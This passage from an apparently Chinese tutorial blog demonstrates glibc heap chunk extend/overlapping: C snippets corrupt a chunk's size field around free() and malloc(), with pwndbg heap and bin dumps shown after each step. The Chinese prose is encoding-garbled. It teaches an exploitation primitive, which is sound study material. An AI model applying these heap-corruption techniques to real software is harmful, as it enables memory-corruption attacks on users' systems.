0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå‘ç°äº†ä¸€ä¸ªç‚¹éœ€è¦æ³¨æ„ï¼Œå°±æ˜¯ free æ‰ size åŸŸä¿®æ”¹äº†ä¹‹åçš„é‚£ä¸ª chunk1 ä¹‹åï¼Œchunk3 çš„ size åŸŸçš„æœ€ä½ä¸ºï¼Œä¹Ÿå°±æ˜¯ p ä½ï¼Œå˜æˆäº† 0ï¼Œè¿™ä¹Ÿå°±è¯´æ˜ï¼Œchunk1 æ²¡æœ‰æ”¾åœ¨ fastbin é‡Œï¼Œä¸Šé¢ä¹Ÿçœ‹åˆ°äº†ï¼Œè¢«æ”¾åœ¨äº† unsortedbin é‡Œã€‚</p><p>â€‹é‚£ä¹ˆä¸ºå•¥ä¼šè¢«æ”¾å…¥ unsortedbin å†…è€Œä¸æ˜¯ smallbin å‘¢ï¼Ÿä¼°è®¡æœ‰ä¸€ä¸‹å‡ ç§å¯èƒ½ï¼š</p><ul><li>å½“ä¸€ä¸ªè¾ƒå¤§çš„ chunk è¢«åˆ†å‰²æˆä¸¤åŠåï¼Œå¦‚æœå‰©ä¸‹çš„éƒ¨åˆ†å¤§äº MINSIZEï¼Œå°±ä¼šè¢«æ”¾åˆ° unsortedbin ä¸­ã€‚</li><li>é‡Šæ”¾ä¸€ä¸ªä¸å±äº fastbin çš„ chunkï¼Œå¹¶ä¸”è¯¥ chunk ä¸å’Œ top chunk ç´§é‚»æ—¶ï¼Œè¯¥ chunk å°±ä¼šè¢«æ”¾åˆ° unsorted bin ä¸­ï¼Œå½“ç¬¬äºŒæ¬¡åˆ†é…çš„æ—¶å€™ï¼Œæ²¡æœ‰åœ¨ unsortedbin ä¸­æ‰¾åˆ°åˆé€‚çš„ï¼Œæ‰ä¼šè¢«æ”¾å…¥åˆ°å…¶å¯¹åº”çš„ bin ä¸­ã€‚</li></ul><p>â€‹ä¹‹åè¿›è¡Œåˆ†é…ï¼Œåˆ†é… 0xa0 å¤§å°çš„å †å—ï¼Œå°±ä¼šå‘ç°ï¼ŒåŸ chunk1 çš„åœ°å€ä¾æ—§æ‹¿å»ç”¨äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0xb1</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x20f31</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/40gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x00000000000000b1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x00000000000000b0  0x0000000000000021</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000020f31</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="3-å¯¹freeçš„smallbinè¿›è¡Œextend"><a class="markdownIt-Anchor" href="#3-å¯¹freeçš„smallbinè¿›è¡Œextend">#</a> 3ã€å¯¹ free çš„ smallbin è¿›è¡Œ extendï¼š</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g 3.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//åˆ†é…ç¬¬ä¸€ä¸ª0x80çš„chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//åˆ†é…ç¬¬äºŒä¸ª0x10çš„chunk2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//é¦–å…ˆè¿›è¡Œé‡Šæ”¾ï¼Œä½¿å¾—chunk1è¿›å…¥unsorted bin</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> *)((<span class="type">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆæ˜¯ä¸¤æ¬¡ mallocï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x20f51</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000020f51&lt;======Top Chunk</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åç›´æ¥ free æ‰ chunk1ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x20f51</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000090  0x0000000000000020&lt;======Chunk2</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000020f51&lt;======Top Chunk</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œè¿˜æ˜¯èƒ½çœ‹å‡ºæ¥å­˜åœ¨ä¸¤ä¸ª chunk çš„ï¼Œå½“ä¿®æ”¹äº† size åŸŸå¤§å°åï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0xb1</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x20f51</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x00000000000000b1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000090  0x0000000000000020</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000020f51</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹åŸæœ¬çš„ä¸‰ä¸ª chunk å˜æˆäº†ä¸¤ä¸ªï¼Œå¹¶ä¸” chunk2 è¿˜æ˜¯ allocated çŠ¶æ€ï¼Œé‡å ä¹‹åï¼Œchunk1 æ˜¯ free çŠ¶æ€ï¼Œæ‰€ä»¥æ•´ä¸ª chunk ä¾æ—§æ˜¯ free çŠ¶æ€ã€‚ä¹‹å malloc (0xa0) è¯•è¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0xb1</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x20f51</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x00000000000000b1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000090  0x0000000000000020</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000020f51</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="4-extendå‰å‘overlapping"><a class="markdownIt-Anchor" href="#4-extendå‰å‘overlapping">#</a> 4ã€extend å‰å‘ overlappingï¼š</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g 4.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//åˆ†é…ç¬¬1ä¸ª 0x80 çš„chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//åˆ†é…ç¬¬2ä¸ª 0x10 çš„chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//åˆ†é…ç¬¬3ä¸ª 0x10 çš„chunk3</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//åˆ†é…ç¬¬4ä¸ª 0x10 çš„chunk4    </span></span><br><span class="line">    *(<span class="type">long</span> *)((<span class="type">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x61</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿˜æ˜¯è€æ ·å­ï¼Œè¿›è¡Œ 4 æ¬¡ mallocï¼Œçœ‹ä¸‹ heap å’Œ bin ä»¥åŠ chunk çš„å†…å®¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758080</span><br><span class="line">Size: 0x20f81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000021&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000021&lt;======Chunk3</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000021&lt;======Chunk4</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000020f81&lt;======Top Chunk</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åä¿®æ”¹ size åŸŸï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758080</span><br><span class="line">Size: 0x20f81</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span 